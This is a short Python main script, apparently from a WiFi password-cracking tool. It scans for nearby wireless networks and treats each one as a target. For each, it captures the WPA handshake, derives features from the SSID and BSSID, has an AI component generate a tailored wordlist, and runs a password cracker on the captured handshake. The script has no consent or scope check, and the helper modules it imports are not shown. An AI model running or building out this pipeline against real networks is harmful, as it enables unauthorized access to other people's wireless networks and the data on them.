from network.scanner import scan_networks
from network.handshake import capture_handshake
from cracking.crack_manager import crack_password
from ai.feature_extractor import extract_features
from cracking.wordlist_manager import WordlistManager

def main():
    # Step 1: Scan networks
    networks = scan_networks()
    for network in networks:
        print(f"Targeting: {network['ssid']} ({network['bssid']})")

        # Step 2: Capture handshake
        capture_handshake(network["bssid"], network["channel"])

        # Step 3: Extract network features
        features = extract_features(network["ssid"], network["bssid"])

        # Step 4: Generate wordlist with AI
        wordlist_manager = WordlistManager()
        wordlist_path = wordlist_manager.generate_wordlist(features)

        # Step 5: Crack password
        crack_password("data/captures/handshake.hccapx", wordlist_path)

if __name__ == "__main__":
    main()
